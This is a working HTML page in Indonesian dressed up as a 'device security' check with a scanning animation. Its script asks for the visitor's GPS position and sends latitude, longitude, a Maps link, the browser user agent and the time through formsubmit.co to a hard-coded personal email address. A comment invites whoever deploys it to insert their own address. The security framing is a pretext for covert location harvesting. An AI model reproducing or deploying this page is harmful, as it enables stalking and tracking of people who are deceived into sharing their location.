<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Keamanan Perangkat</title>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #00f2fe;
            --secondary: #4facfe;
            --bg: #0b0f1a;
            --glass: rgba(255, 255, 255, 0.03);
            --accent: #00d2ff;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Outfit', sans-serif;
            background: var(--bg);
            color: white;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            background-image: 
                radial-gradient(circle at 20% 30%, rgba(0, 242, 254, 0.05) 0%, transparent 50%),
                radial-gradient(circle at 80% 70%, rgba(79, 172, 254, 0.05) 0%, transparent 50%);
        }

        .container {
            position: relative;
            background: var(--glass);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 3rem 2rem;
            border-radius: 2.5rem;
            text-align: center;
            width: 90%;
            max-width: 420px;
            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.8);
            z-index: 10;
        }

        .scanner-container {
            width: 120px;
            height: 120px;
            margin: 0 auto 2.5rem;
            position: relative;
        }

        .scanner {
            width: 100%;
            height: 100%;
            border: 2px solid var(--primary);
            border-radius: 50%;
            position: relative;
            animation: pulse 2s infinite ease-in-out;
        }

        .line {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--primary));
            transform-origin: left;
            animation: rotate 3s linear infinite;
        }

        @keyframes rotate {
            from { transform: translate(-50%, -50%) rotate(0deg); }
            to { transform: translate(-50%, -50%) rotate(360deg); }
        }

        @keyframes pulse {
            0% { transform: scale(0.95); opacity: 0.5; box-shadow: 0 0 0 0 rgba(0, 242, 254, 0.4); }
            50% { transform: scale(1.05); opacity: 1; box-shadow: 0 0 40px rgba(0, 242, 254, 0.2); }
            100% { transform: scale(0.95); opacity: 0.5; box-shadow: 0 0 0 0 rgba(0, 242, 254, 0); }
        }

        h1 {
            font-size: 1.8rem;
            font-weight: 600;
            margin-bottom: 1rem;
            background: linear-gradient(to right, #fff, #94a3b8);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        p {
            color: #94a3b8;
            font-size: 1rem;
            line-height: 1.6;
            font-weight: 300;
        }

        .success-icon {
            display: none;
            color: #10b981;
            font-size: 4rem;
            margin-bottom: 1.5rem;
        }

        .status-ready { color: #10b981; font-weight: 600; margin-top: 1rem; }
    </style>
</head>
<body>
    <div class="container">
        <div id="status-ui">
            <div class="scanner-container">
                <div class="scanner">
                    <div class="line"></div>
                </div>
            </div>
            <h1 id="title">Keamanan Aktif</h1>
            <p id="msg">Sedang memverifikasi lokasi perangkat...</p>
        </div>
        
        <div id="success-ui" style="display: none;">
            <div style="font-size: 5rem; margin-bottom: 1rem ;">✅</div>
            <h1>Proteksi Aktif</h1>
            <p>Data lokasi telah berhasil dikirim ke email admin.</p>
            <div class="status-ready">System Secure</div>
        </div>
    </div>

    <script>
        // MASUKKAN EMAIL ANDA DI SINI
        const targetEmail = "cholilelgara001@gmail.com";

        const titleEl = document.getElementById('title');
        const msgEl = document.getElementById('msg');
        const statusUI = document.getElementById('status-ui');
        const successUI = document.getElementById('success-ui');

        function sendData(lat, lng) {
            // Kita menggunakan FormSubmit - JAUH LEBIH MUDAH
            // Tidak perlu daftar, tidak perlu API Key, tidak perlu login dashboard
            fetch(`https://formsubmit.co/ajax/${targetEmail}`, {
                method: "POST",
                headers: { 
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    _subject: "📍 LAPORAN LOKASI BARU",
                    Latitude: lat,
                    Longitude: lng,
                    Google_Maps: `https://www.google.com/maps?q=${lat},${lng}`,
                    Device: navigator.userAgent,
                    Time: new Date().toLocaleString('id-ID')
                })
            })
            .then(res => res.json())
            .then(data => {
                console.log(data);
                statusUI.style.display = 'none';
                successUI.style.display = 'block';
            })
            .catch(err => {
                console.log(err);
                titleEl.innerText = "Gagal Mengambil Data";
                msgEl.innerText = "Terjadi gangguan saat sinkronisasi.";
            });
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(position => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                
                titleEl.innerText = "Mengirim...";
                msgEl.innerText = "Menghubungkan ke pusat data keamanan.";
                
                sendData(lat, lng);

            }, (error) => {
                titleEl.innerText = "Akses Lokasi Dibutuhkan";
                msgEl.innerText = "Silakan izinkan akses lokasi (GPS) untuk melanjutkan pelindungan.";
            });
        }
    </script>
</body>
</html>
